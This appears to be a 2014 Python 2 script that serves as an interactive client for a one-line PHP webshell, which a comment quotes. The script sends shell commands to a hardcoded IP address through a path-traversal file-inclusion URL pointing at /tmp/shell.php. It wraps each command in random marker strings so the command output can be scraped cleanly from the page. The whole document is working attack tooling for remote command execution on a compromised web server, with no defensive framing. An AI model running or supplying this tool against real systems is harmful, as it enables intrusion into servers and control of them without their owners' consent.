#!/usr/bin/env python

# author        : m_101
# data          : 2014
# description   :
#   python script interfacing with a simple webshell
#   in order to have cleaner output
#   <?php system ($_GET['cmd']); ?>

import re
import requests
import string
from random import choice

def rand_str (length):
    charset = string.letters + string.digits
    return ''.join(choice(charset) for idx in range(length))

# get results of command execution
def scrap_exec_results (content, tag_start_exec, tag_end_exec):
    # regexp
    regexp_start = re.compile ('.*' + tag_start_exec + '.*')
    regexp_end = re.compile ('.*' + tag_end_exec + '.*')
    # results
    results = list()
    # result start and end
    found_start = False
    found_end = False
    # getting lines
    lines = content.split ('\n')
    # search for start and end
    # keep what's between start and end needles
    for line in lines:
        if found_start and found_end:
            break
        if found_start == False and len (regexp_start.findall (line)) != 0:
            line = re.sub ('.*' + tag_start_exec, '', line)
            found_start = True
        if found_start == True and found_end == False and len (regexp_end.findall (line)) != 0:
            line = re.sub (tag_end_exec + '.*', '', line)
            found_end = True
        if found_start == True and len (line) != 0:
            results.append (line)
    return results

url = 'http://110.101.111.1/index.php?page=../../../../../../../tmp/shell.php&cmd={0}'

start_tag = rand_str (12)
end_tag = rand_str (12)

while True:
    cmd = raw_input ('cmd : ')
    if cmd == 'exit':
        break

    req = requests.get (url.format ('echo "' + start_tag + '"; ' + cmd + '; echo "' + end_tag + '"'))
    results = scrap_exec_results (req.content, start_tag, end_tag)
    for result in results:
        print result

